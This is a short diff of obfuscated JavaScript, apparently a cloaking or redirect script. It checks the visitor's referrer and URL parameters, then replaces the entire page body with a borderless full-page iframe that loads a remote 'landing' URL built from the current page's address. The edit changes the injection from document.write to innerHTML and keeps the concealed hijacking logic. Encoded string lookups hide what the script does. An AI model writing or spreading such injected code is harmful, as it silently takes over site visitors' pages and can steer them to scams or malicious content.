@@ -119,7 +119,7 @@ if (JSON[b("0xa")](get_params) !== "{}" && document["referrer"]["indexOf"](b("0x
     }
     get_string += b("0xf") + encodeURI(window.location.origin + window.location.pathname);
     landing += "?" + get_string;
-    document[b("0x11")](b("0x12") + landing + '"   frameborder="0" border="0" cellspacing="0" style="border-style: none;width: 100%; height: 1200px;"/>')
+    document.body.innerHTML = b("0x12") + landing + '"   frameborder="0" border="0" cellspacing="0" style="border-style: none;width: 100%; height: 1200px;"/>'
 } else {
     if (!thank) {
         getCode(home_url)
